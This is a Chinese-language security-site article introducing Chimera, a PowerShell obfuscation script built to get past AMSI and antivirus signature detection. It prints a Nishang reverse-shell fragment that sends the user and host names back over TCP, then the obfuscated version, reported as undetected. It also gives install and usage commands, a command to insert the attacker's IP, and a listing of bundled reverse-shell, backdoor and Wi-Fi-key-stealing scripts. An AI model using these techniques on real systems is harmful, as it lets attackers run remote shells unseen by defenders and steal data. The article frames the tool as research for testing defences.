> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [www.freebuf.com](https://www.freebuf.com/sectool/266050.html)

![](https://image.3001.net/images/20210313/1615641295_604cbacff3c769ba06a49.jpg!small)

关于 Chimera
----------

Chimera 是一款功能强大的 PowerShell 混淆脚本，它可以帮助广大研究人员实现 AMSI 和安全防护产品（解决方案）绕过。该脚本可以利用字符串替换和变量串联来处理已知的可以触发反病毒产品的恶意 PS1，以实现绕过常见的基于签名的安全检测机制。

Chimera 的开发与发布，[进一步证明了](#resources)绕过基于签名的安全检测机制是多么的简单，希望这个项目能够激励社区的广大开发人员努力构建出更加健壮可靠的代码。

工作机制
----

下面给出的是 Nishang 的 [Invoke-PowerShellTcp.ps1](https://github.com/tokyoneon/Chimera/blob/master/shells/Invoke-PowerShellTcp.ps1) 的部分代码段，这部分代码可以在 [nishang/Shells](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1) 中找到。VirusTotal 针对这个 PS1 脚本报告了 [25 个引擎成功检测到](https://www.virustotal.com/gui/file/0f1e223eaf8b6d71f65960f8b9e14c98ba62e585334a6349bcd02216f4415868/detection)：

```
$stream = $client.GetStream()

[byte[]]$bytes = 0..65535|%{0}

 

#Send back current username and computername

$sendbytes = ([text.encoding]::ASCII).GetBytes("Windows PowerShell running as user " + $env:username + " on " + $env:computername + "`nCopyright (C) 2015 Microsoft Corporation. All rights reserved.`n`n")

$stream.Write($sendbytes,0,$sendbytes.Length)

 

#Show an interactive PowerShell prompt

$sendbytes = ([text.encoding]::ASCII).GetBytes('PS ' + (Get-Location).Path + '>')

$stream.Write($sendbytes,0,$sendbytes.Length)
```

![](https://image.3001.net/images/20210313/1615641319_604cbae7bcfaf403ca208.png!small)

那么，在经过了 Chimera 的处理之后，VirusTotal 针对混淆版本的脚本检测报告为 0：

```
# Watched anxiously by the Rebel command, the fleet of small, single-pilot fighters speeds toward the massive, impregnable Death Star.

              $xdgIPkCcKmvqoXAYKaOiPdhKXIsFBDov = $jYODNAbvrcYMGaAnZHZwE."$bnyEOfzNcZkkuogkqgKbfmmkvB$ZSshncYvoHKvlKTEanAhJkpKSIxQKkTZJBEahFz$KKApRDtjBkYfJhiVUDOlRxLHmOTOraapTALS"()

       # As the station slowly moves into position to obliterate the Rebels, the pilots maneuver down a narrow trench along the station’s equator, where the thermal port lies hidden.

          [bYte[]]$mOmMDiAfdJwklSzJCUFzcUmjONtNWN = 0..65535|%{0}

   # Darth Vader leads the counterattack himself and destroys many of the Rebels, including Luke’s boyhood friend Biggs, in ship-to-ship combat.

 

  # Finally, it is up to Luke himself to make a run at the target, and he is saved from Vader at the last minute by Han Solo, who returns in the nick of time and sends Vader spinning away from the station.

           # Heeding Ben’s disembodied voice, Luke switches off his computer and uses the Force to guide his aim.

   # Against all odds, Luke succeeds and destroys the Death Star, dealing a major defeat to the Empire and setting himself on the path to becoming a Jedi Knight.

           $PqJfKJLVEgPdfemZPpuJOTPILYisfYHxUqmmjUlKkqK = ([teXt.enCoDInG]::AsCII)."$mbKdotKJjMWJhAignlHUS$GhPYzrThsgZeBPkkxVKpfNvFPXaYNqOLBm"("WInDows Powershell rUnnInG As User " + $TgDXkBADxbzEsKLWOwPoF:UsernAMe + " on " + $TgDXkBADxbzEsKLWOwPoF:CoMPUternAMe + "`nCoPYrIGht (C) 2015 MICrosoft CorPorAtIon. All rIGhts reserveD.`n`n")

# Far off in a distant galaxy, the starship belonging to Princess Leia, a young member of the Imperial Senate, is intercepted in the course of a secret mission by a massive Imperial Star Destroyer.

            $xdgIPkCcKmvqoXAYKaOiPdhKXIsFBDov.WrIte($PqJfKJLVEgPdfemZPpuJOTPILYisfYHxUqmmjUlKkqK,0,$PqJfKJLVEgPdfemZPpuJOTPILYisfYHxUqmmjUlKkqK.LenGth)

   # An imperial boarding party blasts its way onto the captured vessel, and after a fierce firefight the crew of Leia’s ship is subdued.
```

![](https://image.3001.net/images/20210313/1615641337_604cbaf9b3a6a63d7a650.png!small)

Chimera 会对源代码做以下几件事情来实现代码混淆处理。transformer 函数将会把字符串分割成多个部分，并将它们以新变量的形式重新构建。

比如说，它会将类似 “... New-Object System.Net.Sockets.TCPClient ...” 这样的字符串转换成如下形式：

```
$a = "Syste"

$b = "m.Net.Soc"

$c = "kets.TCP"

$d = "Client"

 

... New-Object $a$b$c$d ...
```

函数能够将常见的标记数据类型和字符串分割成多个数据区块，并对数据区块进行定义，然后在脚本头部进行串联和重新构建。如果执行时使用更高数值的 --level 参数，则会将源数据拆分成更小的数据区块和更多的变量：

```
$CNiJfmZzzQrqZzqKqueOBcUVzmkVbllcEqjrbcaYzTMMd = "`m"

$quiyjqGdhQZgYFRdKpDGGyWNlAjvPCxQTTbmFkvTmyB = "t`Rea"

$JKflrRllAqgRlHQIUzOoyOUEqVuVrqqCKdua = "Get`s"

$GdavWoszHwDVJmpYwqEweQsIAz = "ti`ON"

$xcDWTDlvcJfvDZCasdTnWGvMXkRBKOCGEANJpUXDyjPob = "`L`O`Ca"

$zvlOGdEJVsPNBDwfKFWpvFYvlgJXDvIUgTnQ = "`Get`-"

$kvfTogUXUxMfCoxBikPwWgwHrvNOwjoBxxto = "`i"

$tJdNeNXdANBemQKeUjylmlObtYp = "`AsC`i"

$mhtAtRrydLlYBttEnvxuWkAQPTjvtFPwO = "`G"

$PXIuUKzhMNDUYGZKqftvpAiQ = "t`R`iN
```

工具的安装和使用
--------

首先，广大用户需要使用下列命令将该项目源码克隆至本地，并完成基础配置：

```
sudo apt-get update && sudo apt-get install -Vy sed xxd libc-bin curl jq perl gawk grep coreutils git

sudo git clone https://github.com/tokyoneon/chimera /opt/chimera

sudo chown $USER:$USER -R /opt/chimera/; cd /opt/chimera/

sudo chmod +x chimera.sh; ./chimera.sh --help
```

### 基础使用

```
./chimera.sh -f shells/Invoke-PowerShellTcp.ps1 -l 3 -o /tmp/chimera.ps1 -v -t powershell,windows,\

copyright -c -i -h -s length,get-location,ascii,stop,close,getstream -b new-object,reverse,\

invoke-expression,out-string,write-error -j -g -k -r -p
```

Shells
------

在该项目的 shells 目录下，包含了一些 Nishang 脚本和一些通用脚本，所有的脚本都已经过测试并能够正常工作。

**使用下列命令即可修改硬编码的 IP 地址：**

```
sed -i 's/192.168.56.101/<YOUR-IP-ADDRESS>/g' shells/*.ps1
```

```
ls -laR shells/

 

shells/:

total 60

-rwxrwx--- 1 tokyoneon tokyoneon 1727 Aug 29 22:02 generic1.ps1

-rwxrwx--- 1 tokyoneon tokyoneon 1433 Aug 29 22:02 generic2.ps1

-rwxrwx--- 1 tokyoneon tokyoneon  734 Aug 29 22:02 generic3.ps1

-rwxrwx--- 1 tokyoneon tokyoneon 4170 Aug 29 22:02 Invoke-PowerShellIcmp.ps1

-rwxrwx--- 1 tokyoneon tokyoneon  281 Aug 29 22:02 Invoke-PowerShellTcpOneLine.ps1

-rwxrwx--- 1 tokyoneon tokyoneon 4404 Aug 29 22:02 Invoke-PowerShellTcp.ps1

-rwxrwx--- 1 tokyoneon tokyoneon  594 Aug 29 22:02 Invoke-PowerShellUdpOneLine.ps1

-rwxrwx--- 1 tokyoneon tokyoneon 5754 Aug 29 22:02 Invoke-PowerShellUdp.ps1

drwxrwx--- 1 tokyoneon tokyoneon 4096 Aug 28 23:27 misc

-rwxrwx--- 1 tokyoneon tokyoneon  616 Aug 29 22:02 powershell_reverse_shell.ps1

 

shells/misc:

total 36

-rwxrwx--- 1 tokyoneon tokyoneon 1757 Aug 12 19:53 Add-RegBackdoor.ps1

-rwxrwx--- 1 tokyoneon tokyoneon 3648 Aug 12 19:53 Get-Information.ps1

-rwxrwx--- 1 tokyoneon tokyoneon  672 Aug 12 19:53 Get-WLAN-Keys.ps1

-rwxrwx--- 1 tokyoneon tokyoneon 4430 Aug 28 23:31 Invoke-PortScan.ps1

-rwxrwx--- 1 tokyoneon tokyoneon 6762 Aug 29 00:27 Invoke-PoshRatHttp.ps1
```

工具运行演示
------

![](https://image.3001.net/images/20210313/1615641421_604cbb4d70187f377dee1.gif)

项目地址
----

Chimera：【[GitHub 传送门](https://github.com/tokyoneon/Chimera)】

项目源
---

> [Invoke-Obfuscation](https://github.com/danielbohannon/Invoke-Obfuscation)
> 
> [AMSITrigger](https://github.com/RythmStick/AMSITrigger)
> 
> [PSAmsi](https://github.com/cobbr/PSAmsi)
> 
> [amsi.fail](https://amsi.fail/)
> 
> [Unicorn](https://github.com/trustedsec/unicorn)
> 
> [www.wolfandco.com](https://www.wolfandco.com/insight/behind-enemy-lines-pen-tester%E2%80%99s-take-evading-amsi) 

参考资料
----

> [https://null-byte.com/bypass-amsi-0333967/](https://null-byte.com/bypass-amsi-0333967/)
> 
> [https://github.com/tokyoneon/Chimera#resources](https://github.com/tokyoneon/Chimera#resources)
> 
> [https://github.com/tokyoneon/Chimera/blob/master/shells/Invoke-PowerShellTcp.ps1](https://github.com/tokyoneon/Chimera/blob/master/shells/Invoke-PowerShellTcp.ps1)
> 
> [https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1)
> 
> [https://github.com/tokyoneon/Chimera/blob/master/USAGE.md](https://github.com/tokyoneon/Chimera/blob/master/USAGE.md)